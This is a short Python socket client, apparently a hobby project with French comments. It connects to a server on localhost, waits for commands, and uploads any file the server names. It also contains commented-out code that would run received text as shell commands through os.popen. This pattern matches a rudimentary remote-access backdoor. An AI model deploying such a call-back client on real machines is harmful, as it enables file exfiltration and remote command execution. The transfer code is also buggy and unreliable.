import socket
import os
import time

connexion_avec_serveur = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
etat = 0
while etat == 0:
    try:
        connexion_avec_serveur.connect(('localhost', 12800))
        etat = 1
    except:
        print ("echec")


connexion_avec_serveur.send(b"je suis en ligne")


def upload(nomFich):
    if nomFich != "":
        try:
            fich = open(nomFich, "rb")  # test si le fichier existe
            fich.close()

            octets = os.path.getsize(nomFich) / 1024

            donne = "NAME " + nomFich + "OCTETS " + str(octets)
            connexion_avec_serveur.send(donne.encode()) # Envoi du nom et de la taille du fichier

            # Boucle temps que l'ont est connecte
            ############################################
            while (connexion_avec_serveur.connect):

                recu = connexion_avec_serveur.recv(1024)
                if not recu: break

                if recu == b"GO":  # Si le serveur accepte on envoi le fichier
                    print(" >> Le serveur accepte le transfert")
                    print(time.strftime(" >> [%H:%M] transfert en cours veuillez patienter..."))
                    print(" ")

                    num = 0
                    pourcent = 0
                    octets = octets * 1024  # Reconverti en octets
                    fich = open(nomFich, "rb")
                    print("on envoie")
                    if octets > 1024:  # Si le fichier est plus lourd que 1024 on l'envoi par paquet
                        for i in range(int(octets / 1024)):

                            fich.seek(num,
                                      0)  # on se deplace par rapport au numero de caractere (de 1024 a 1024 octets)
                            donnees = fich.read(1024)  # Lecture du fichier en 1024 octets
                            connexion_avec_serveur.send(donnees)  # Envoi du fichier par paquet de 1024 octets
                            num = num + 1024

                            # Condition pour afficher le % du transfert (pas trouve mieu) :
                            if pourcent == 0 and num > octets / 100 * 10 and num < octets / 100 * 20:
                                print(" >> 10%")
                                pourcent = 1
                            elif pourcent == 1 and num > octets / 100 * 20 and num < octets / 100 * 30:
                                print(" >> 20%")
                                pourcent = 2
                            elif pourcent < 3 and num > octets / 100 * 30 and num < octets / 100 * 40:
                                print(" >> 30%")
                                pourcent = 3
                            elif pourcent < 4 and num > octets / 100 * 40 and num < octets / 100 * 50:
                                print(" >> 40%")
                                pourcent = 4
                            elif pourcent < 5 and num > octets / 100 * 50 and num < octets / 100 * 60:
                                print(" >> 50%")
                                pourcent = 5
                            elif pourcent < 6 and num > octets / 100 * 60 and num < octets / 100 * 70:
                                print(" >> 60%")
                                pourcent = 6
                            elif pourcent < 7 and num > octets / 100 * 70 and num < octets / 100 * 80:
                                print(" >> 70%")
                                pourcent = 7
                            elif pourcent < 8 and num > octets / 100 * 80 and num < octets / 100 * 90:
                                print(" >> 80%")
                                pourcent = 8
                            elif pourcent < 9 and num > octets / 100 * 90 and num < octets / 100 * 100:

                                pourcent = 9

                    else:  # Sinon on envoi tous d'un coup
                        donnees = fich.read()
                        connexion_avec_serveur.send(donnees)

                    fich.close()
                    print("")
                    print(time.strftime(" >> Le %d/%m a %H:%M transfert termine !"))
                    connexion_avec_serveur.send(b"BYE")

        except:
            # le fichier est introuvable
            connexion_avec_serveur.send("error1".encode())
            exit()


while 1:
    rec = connexion_avec_serveur.recv(1024)
    print(rec)
    if rec.split()[0] == b"upload":
        print("on entre dans upload")
        upload(rec.split()[1].decode())
    # rep = os.popen(rec.decode())
    # print(rep)

    # connexion_avec_serveur.send(rep.read().encode())






